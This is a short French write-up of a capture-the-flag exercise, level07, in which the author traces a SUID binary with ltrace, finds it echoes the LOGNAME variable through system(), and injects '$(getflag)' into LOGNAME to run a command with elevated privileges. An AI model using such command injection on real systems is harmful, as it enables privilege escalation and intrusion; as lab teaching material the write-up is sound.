# level 07

En faisant ```ls -la``` dans le repertoire courant, on constate de nouveau un fichier avec le SUID set pour le flag07. 

Mais cette fois, pas de code source. 

Quand on l'execute, il affiche ```level07```.

En utilisant la commande ```ltrace ./level07``` on peut voir les appels faits par ce programme vers les librairies. 

On constate deux lignes interessantes :
```bash
getenv("LOGNAME")                                              = "level07"
```
et 
```bash
system("/bin/echo level07 "level07
```

On comprend donc que le programme recupere la variable d'environnement ```LOGNAME```, puis ```echo``` cette variable.

On va donc tenter d'inserer la commande ```getflag``` dans la variable ```LOGNAME``` pour pousser le programme a l'executer avec le SUID de flag07.

```bash
LOGNAME='$(getflag)'
./level07
```

Et le flag s'affiche pour se log sur le level08 !